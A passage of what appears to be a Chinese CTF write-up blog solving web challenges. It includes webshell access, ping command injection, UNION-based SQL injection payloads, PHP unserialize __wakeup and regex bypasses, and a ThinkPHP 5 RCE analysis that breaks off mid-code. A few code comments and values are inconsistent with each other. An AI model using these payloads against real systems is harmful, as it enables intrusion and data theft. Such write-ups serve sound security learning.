</code></pre><p>查看<code>Response</code>。</p><p>获得<code>flag</code>。</p><h3 id=webshell>webshell<a hidden class=anchor aria-hidden=true href=#webshell>#</a></h3><blockquote><p>Des：小宁百度了php一句话,觉着很有意思,并且把它放在index.php里。</p></blockquote><p>御剑扫描后台，没用&mldr;</p><p>查了一下资料，需要其他工具，选择中国蚁剑。</p><p>配好之后添加题目网址，输入密码：<code>shell</code>。</p><p>点击进入，查看<code>flag.txt</code>。</p><p>获得<code>flag</code>。</p><h3 id=comman_execution>comman_execution<a hidden class=anchor aria-hidden=true href=#comman_execution>#</a></h3><blockquote><p>Des：小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。</p></blockquote><p>给出一个<code>ping</code>窗口，尝试本地回环。</p><p>命令可以正常执行，尝试拼接。</p><p>可以正常执行拼接命令，查看当前目录所有文件</p><p>没用，而且只能在当前目录执行命令，尝试搜索当前用户所有<code>txt</code>文档。</p><p>发现<code>flag</code>，根据路径使用<code>cat</code>命令查看<code>flag.txt</code>。</p><p>获得<code>flag</code>。</p><h3 id=simple_js>simple_js<a hidden class=anchor aria-hidden=true href=#simple_js>#</a></h3><blockquote><p>Des：小宁发现了一个网页，但却一直输不对密码。</p></blockquote><pre tabindex=0><code>X-Forwarded-For: 220.249.52.133
</code></pre><p>要求输入密码，随机输入后显示错误，查看网页源码：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>html</span>&gt;
</span></span><span style=display:flex><span>	&lt;<span style=color:#f92672>head</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>title</span>&gt;JS&lt;/<span style=color:#f92672>title</span>&gt;
</span></span><span style=display:flex><span>    &lt;<span style=color:#f92672>script</span> <span style=color:#a6e22e>type</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text/javascript&#34;</span>&gt;
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>dechiffre</span>(<span style=color:#a6e22e>pass_enc</span>) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>pass</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&#34;</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>tab</span>  <span style=color:#f92672>=</span> <span style=color:#a6e22e>pass_enc</span>.<span style=color:#a6e22e>split</span>(<span style=color:#e6db74>&#39;,&#39;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>tab2</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>pass</span>.<span style=color:#a6e22e>split</span>(<span style=color:#e6db74>&#39;,&#39;</span>);
</span></span><span style=display:flex><span>      	<span style=color:#66d9ef>var</span> <span style=color:#a6e22e>i</span>,<span style=color:#a6e22e>j</span>,<span style=color:#a6e22e>k</span>,<span style=color:#a6e22e>l</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>,<span style=color:#a6e22e>m</span>,<span style=color:#a6e22e>n</span>,<span style=color:#a6e22e>o</span>,<span style=color:#a6e22e>p</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>j</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>tab</span>.<span style=color:#a6e22e>length</span>;
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>k</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>j</span> <span style=color:#f92672>+</span> (<span style=color:#a6e22e>l</span>) <span style=color:#f92672>+</span> (<span style=color:#a6e22e>n</span><span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>n</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>tab2</span>.<span style=color:#a6e22e>length</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (<span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>o</span><span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>); <span style=color:#a6e22e>i</span> <span style=color:#f92672>&lt;</span> (<span style=color:#a6e22e>k</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>j</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>n</span>); <span style=color:#a6e22e>i</span><span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>          <span style=color:#a6e22e>o</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>tab</span>[<span style=color:#a6e22e>i</span><span style=color:#f92672>-</span><span style=color:#a6e22e>l</span>];
</span></span><span style=display:flex><span>          <span style=color:#a6e22e>p</span> <span style=color:#f92672>+=</span> String.<span style=color:#a6e22e>fromCharCode</span>((<span style=color:#a6e22e>o</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>tab2</span>[<span style=color:#a6e22e>i</span>]));
</span></span><span style=display:flex><span>          <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>i</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>5</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (<span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> (<span style=color:#a6e22e>o</span><span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>); <span style=color:#a6e22e>i</span> <span style=color:#f92672>&lt;</span> (<span style=color:#a6e22e>k</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>j</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>n</span>); <span style=color:#a6e22e>i</span><span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>          <span style=color:#a6e22e>o</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>tab</span>[<span style=color:#a6e22e>i</span><span style=color:#f92672>-</span><span style=color:#a6e22e>l</span>];
</span></span><span style=display:flex><span>          <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>i</span> <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>5</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>i</span> <span style=color:#f92672>&lt;</span> <span style=color:#a6e22e>k</span><span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>          	<span style=color:#a6e22e>p</span> <span style=color:#f92672>+=</span> String.<span style=color:#a6e22e>fromCharCode</span>((<span style=color:#a6e22e>o</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>tab2</span>[<span style=color:#a6e22e>i</span>]));
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>p</span> <span style=color:#f92672>+=</span> String.<span style=color:#a6e22e>fromCharCode</span>(<span style=color:#a6e22e>tab2</span>[<span style=color:#ae81ff>17</span>]);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>pass</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>p</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>pass</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    String[<span style=color:#e6db74>&#34;fromCharCode&#34;</span>](<span style=color:#a6e22e>dechiffre</span>(<span style=color:#e6db74>&#34;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&#34;</span>));
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>h</span> <span style=color:#f92672>=</span> window.<span style=color:#a6e22e>prompt</span>(<span style=color:#e6db74>&#39;Enter password&#39;</span>);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>alert</span>(<span style=color:#a6e22e>dechiffre</span>(<span style=color:#a6e22e>h</span>));
</span></span><span style=display:flex><span>		&lt;/<span style=color:#f92672>script</span>&gt;
</span></span><span style=display:flex><span>	&lt;/<span style=color:#f92672>head</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>html</span>&gt;
</span></span></code></pre></div><p>代码审计，加了很多不必要的代码，将<code>fromCharCode</code>字符串中的十六进制转文本，得到<code>55,56,54,79,115,69,114,116,107,49,50</code>，写一个<code>python</code>脚本返回整数所对应的<code>Unicode</code>字符：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>s <span style=color:#f92672>=</span> [<span style=color:#ae81ff>55</span>,<span style=color:#ae81ff>56</span>,<span style=color:#ae81ff>54</span>,<span style=color:#ae81ff>79</span>,<span style=color:#ae81ff>115</span>,<span style=color:#ae81ff>69</span>,<span style=color:#ae81ff>114</span>,<span style=color:#ae81ff>116</span>,<span style=color:#ae81ff>107</span>,<span style=color:#ae81ff>49</span>,<span style=color:#ae81ff>50</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> s:
</span></span><span style=display:flex><span>  print(chr(i), end<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>)
</span></span></code></pre></div><p>将输出结果加上给定<code>flag</code>格式。</p><p>获得<code>flag</code>。</p><h3 id=newscenter>NewsCenter<a hidden class=anchor aria-hidden=true href=#newscenter>#</a></h3><blockquote><p>Des：N/A。</p></blockquote><p>只给了一个输入框，源码无提示。</p><p>尝试查看是否存在<code>SQL注入</code>，依次输入1、2、3、4，到4时页面无回显，初步判断存在。继续尝试注入语句，发现页面会无法处理请求，发现需要把前面的语句先闭合再进行注入。</p><p>爆表：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#e6db74>&#39;and -1 union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.TABLES#
</span></span></span></code></pre></div><p>最下面有一个<code>secret_table</code>，这里面应该就是我们需要的信息。</p><p>爆列：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#e6db74>&#39;and -1 union select 1,COLUMN_NAME,DATA_TYPE from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME=&#39;</span>secret_table<span style=color:#e6db74>&#39;#
</span></span></span></code></pre></div><p>得到两个表：</p><pre tabindex=0><code>id
fl4g
</code></pre><p>爆字段：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#e6db74>&#39;and -1 union select 1,2,fl4g from secret_table#
</span></span></span></code></pre></div><h2 id=web进阶>Web进阶<a hidden class=anchor aria-hidden=true href=#web进阶>#</a></h2><h3 id=baby_web>baby_web<a hidden class=anchor aria-hidden=true href=#baby_web>#</a></h3><blockquote><p>Des：想想初始页面是哪个。</p></blockquote><p>页面为<code>1.php</code>。</p><p><code>dirb</code>扫描目录，初始页面被重定向到<code>1.php</code>。</p><p>尝试访问<code>index.php</code>，在控制台查看访问记录。</p><p>获得<code>flag</code>。</p><h3 id=training-www-robots>Training-WWW-Robots<a hidden class=anchor aria-hidden=true href=#training-www-robots>#</a></h3><blockquote><p>Des：N/A。</p></blockquote><p>访问<code>robots.txt</code>。</p><p>访问<code>fl0g.php</code>。</p><p>获得<code>flag</code>。</p><h3 id=unserialize3>unserialize3<a hidden class=anchor aria-hidden=true href=#unserialize3>#</a></h3><blockquote><p>Des：N/A。</p></blockquote><blockquote><p>PHP__wakeup()函数漏洞</p><p>在程序执行前，serialize()函数会首先检查是否存在一个魔术方法<code>_sleep()</code>，如果存在，<code>_sleep()</code>方法会先被调用， 然后才执行序列化操作。这个功能可以用于清理对象并返回一个包含对象中所有变量名称的数组。如果该方法不返回任何内容，则NULL被序列化，导致一个E_NOTICE错误。与之相反，unserialize()会检查是否存在一个wakeup方法。如果存在，则会先调用__wakeup方法，预先准备对象数据。但是这个__wakeup()是可以被绕过的。</p><p>__wakeup触发于unserilize() 调用之前，当反序列化时的字符串所对应的对象的数目被修改，wake 的函数就不会被调用且不会重建为对象，但是会触发其他的魔术方法。</p></blockquote><p>本题使用<code>code</code>进行传参，利用<code>__wakeup</code>函数漏洞，当序列化字符串表示对象属性个数的值大于真实个数属性时就会跳过<code>__wakeup</code>的执行。</p><p>先用<code>php</code>脚本跑出序列化字符串：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>xctf</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> $flag <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;111&#39;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __wakeup() {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>exit</span>(<span style=color:#e6db74>&#39;bad requests&#39;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>$c <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>xctf</span>();
</span></span><span style=display:flex><span><span style=color:#66d9ef>print</span>(<span style=color:#a6e22e>serialize</span>($c));
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>结果:</p><pre tabindex=0><code>O:4:&#34;xctf&#34;:1:{s:4:&#34;flag&#34;;s:3:&#34;111&#34;;}
</code></pre><p>将上述结果赋给<code>code</code>参数。</p><p>获得<code>flag</code>。</p><h3 id=web-php-unserialize>Web php unserialize<a hidden class=anchor aria-hidden=true href=#web-php-unserialize>#</a></h3><blockquote><p>Des：N/A。</p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span> 
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Demo</span> { 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>private</span> $file <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;index.php&#39;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __construct($file) { 
</span></span><span style=display:flex><span>        $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>file</span> <span style=color:#f92672>=</span> $file; 
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> __destruct() { 
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#f92672>@</span><span style=color:#a6e22e>highlight_file</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>file</span>, <span style=color:#66d9ef>true</span>); 
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>function</span> __wakeup() { 
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>file</span> <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;index.php&#39;</span>) { 
</span></span><span style=display:flex><span>            <span style=color:#75715e>//the secret is in the fl4g.php
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>file</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;index.php&#39;</span>; 
</span></span><span style=display:flex><span>        } 
</span></span><span style=display:flex><span>    } 
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;var&#39;</span>])) { 
</span></span><span style=display:flex><span>    $var <span style=color:#f92672>=</span> <span style=color:#a6e22e>base64_decode</span>($_GET[<span style=color:#e6db74>&#39;var&#39;</span>]); 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/[oc]:\d+:/i&#39;</span>, $var)) { 
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;stop hacking!&#39;</span>); 
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>        <span style=color:#f92672>@</span><span style=color:#a6e22e>unserialize</span>($var); 
</span></span><span style=display:flex><span>    } 
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> { 
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>highlight_file</span>(<span style=color:#e6db74>&#34;index.php&#34;</span>); 
</span></span><span style=display:flex><span>} 
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>简单写个<code>php</code>脚本：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Demo</span> {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>private</span> $file <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;index.php&#39;</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>function</span> __construct($file) {
</span></span><span style=display:flex><span>    $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>file</span> <span style=color:#f92672>=</span> $file;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>function</span> __destruct() {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span> <span style=color:#f92672>@</span><span style=color:#a6e22e>highlight_file</span>($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>file</span>, <span style=color:#66d9ef>true</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>function</span> __wakeup() {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> ($this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>file</span> <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;index.php&#39;</span>) {
</span></span><span style=display:flex><span>      <span style=color:#75715e>// the secret is in the fl4g.php
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      $this<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>file</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;index.php&#39;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>$tmp <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>Demo</span>(<span style=color:#e6db74>&#39;fl4g.php&#39;</span>);
</span></span><span style=display:flex><span>$res <span style=color:#f92672>=</span> <span style=color:#a6e22e>serialize</span>($tmp);
</span></span><span style=display:flex><span><span style=color:#75715e>// O:4:&#34;Demo&#34;:1:{s:10:&#34;Demofile&#34;;s:8:&#34;fl4g.php&#34;;}
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$res <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_replace</span>(<span style=color:#e6db74>&#39;O:4&#39;</span>, <span style=color:#e6db74>&#39;O:+4&#39;</span>, $res);	<span style=color:#75715e>// 绕过preg_match()
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$res <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_replace</span>(<span style=color:#e6db74>&#39;:1:&#39;</span>, <span style=color:#e6db74>&#39;:2:&#39;</span>, $res);	<span style=color:#75715e>// 绕过__wakeup()
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>var_dump</span>($res);
</span></span><span style=display:flex><span><span style=color:#75715e>// &#34;O:+4:&#34;Demo&#34;:1:{s:10:&#34;Demofile&#34;;s:8:&#34;fl4g.php&#34;;}
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>var_dump</span>(<span style=color:#a6e22e>base64_encode</span>(<span style=color:#a6e22e>res</span>));
</span></span><span style=display:flex><span><span style=color:#75715e>// TzorNDoiRGVtbyI6Mjp7czoxMdoiAERlbW8AZmlsZSI7czo40iJmbDRnLnBocCI7fQ==
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>给变量<code>var</code>传参<code>TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code>。</p><p>获得<code>flag</code>。</p><h3 id=php-rce>php rce<a hidden class=anchor aria-hidden=true href=#php-rce>#</a></h3><blockquote><p>Des：N/A。</p></blockquote><p>查看控制台元素，无有用信息。</p><p>御剑扫描后台，发现<code>robots.txt</code>。</p><p>根据题目名称搜索<code>Think PHP V5 rce</code>漏洞</p><p>发现补丁修改后的代码：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$controller <span style=color:#f92672>=</span> <span style=color:#a6e22e>strp_tags</span>($result[<span style=color:#ae81ff>1</span>] <span style=color:#f92672>?:</span> $config[<span style=color:#e6db74>&#39;default_controller&#39;</span>]);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#39;/^[A-Za-z](\w)*$/&#39;</span>, $controller)) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>HttpException</span>(<span style=color:#ae81ff>404</span>, <span style=color:#e6db74>&#39;controller not exists:&#39;</span> <span style=color:#f92672>.</span> $controller);
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>从<code>$controller</code>分析，补丁对其名称进行了过滤，继续查看：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>  $instance <span style=color:#f92672>=</span> <span style=color:#a6e22e>Loader</span><span style=color:#f92672>::</span><span style=color:#a6e22e>controller</span>(
</span></span><span style=display:flex><span>  	$controller,
</span></span><span style=display:flex><span>    $config[<span style=color:#e6db74>&#39;url_controller_layer&#39;</span>],
</span></span><span style=display:flex><span>    $config[<span style=color:#e6db74>&#39;controller_suffix&#39;</span>],
</span></span><span style=display:flex><span>    $config[<span style=color:#e6db74>&#39;empty_controller&#39;</span>]
</span></span><span style=display:flex><span>  );
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>代码对<code>controller</code>进行了实例化，进入到<code>Loader</code>部分查看：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>controller</span>($name, $layer<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;controller&#39;</span>, $appendSuffix<span style=color:#f92672>=</span><span style=color:#66d9ef>false</span>, $empty<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>list</span>($module, $class) <span style=color:#f92672>=</span> <span style=color:#a6e22e>self</span><span style=color:#f92672>::</span><span style=color:#a6e22e>getModuleAndClass</span>($name, $layer, $appendSuffix);
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>class_exists</span>($class)) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>App</span><span style=color:#f92672>::</span><span style=color:#a6e22e>invokeClass</span>($class);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ($empty) {
</span></span><span style=display:flex><span>    $emptyClass <span style=color:#f92672>=</span> <span style=color:#a6e22e>self</span><span style=color:#f92672>::</span><span style=color:#a6e22e>parseClass</span>($module, $layer, $empty, $appendSuffix);
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>class_exists</span>($emptyClass)) {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>new</span> $emptyClass(<span style=color:#a6e22e>Request</span><span style=color:#f92672>::</span><span style=color:#a6e22e>instance</span>());
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>如果类<code>name</code>存在，进行实例化，并跟进<code>getModuleAndClass</code>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>protected</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>getModuleAndClass</span>($name, $layer, $appendSuffix) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#66d9ef>false</span> <span style=color:#f92672>!=</span> <span style=color:#a6e22e>strpos</span>($name, <span style=color:#e6db74>&#39;\\&#39;</span>)) {
</span></span><span style=display:flex><span>    $module <span style=color:#f92672>=</span> <span style=color:#a6e22e>Request</span><span style=color:#f92672>::</span><span style=color:#a6e22e>instance</span>()<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>module</span>();
</span></span><span style=display:flex><span>    $class <span style=color:#f92672>=</span> $name;
</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>strpos</span>($name, <span style=color:#e6db74>&#39;/&#39;</span>)) {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>list</span>($module, $name) <span style=color:#f92672>=</span> <span style=color:#a6e22e>explode</span>(<span style=color:#e6db74>&#39;/&#39;</span>, $name, <span style=color:#ae81ff>2</span>);
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>      $module <span style=color:#f92672>=</span> <span style=color:#a6e22e>Request</span><span style=color:#f92672>::</span><span style=color:#a6e22e>instance</span>()<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>module</span>();
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    $class <span style=color:#f92672>=</span> <span style=color:#a6e22e>self</span><span style=color:#f92672>::</span><span style=color:#a6e22e>parseClass</span>($module, $layer, $name, $appendSuffix);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> [$module, $class];
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>此函数将<code>module</code>和<code>class</code>返回，用于实例化，利用命名空间的特点，如果能够控制此处的<code>class</code>，即补丁内的<code>controller</code>，就可以实例化任何类。若将控制器设置为<code>\think\App</code>，可以构造<code>payload</code>调用其方法<code>invokeFunction</code>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>invokeFunction</span>($function, $var <span style=color:#f92672>=</span> []) {
</span></span><span style=display:flex><span>  $reflect <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>\ReflectionFunction</span>($function);
</span></span><span style=display:flex><span>  $args <span style=color:#f92672>=</span> <span style=color:#a6e22e>self</span><span style=color:#f92672>::</span><span style=color:#a6e22e>bindParams</span>($reflect, $vars);
</span></span><span style=display:flex><span>  
</span></span><span style=display:flex><span>  <span style=color:#75715e>// 记录执行信息
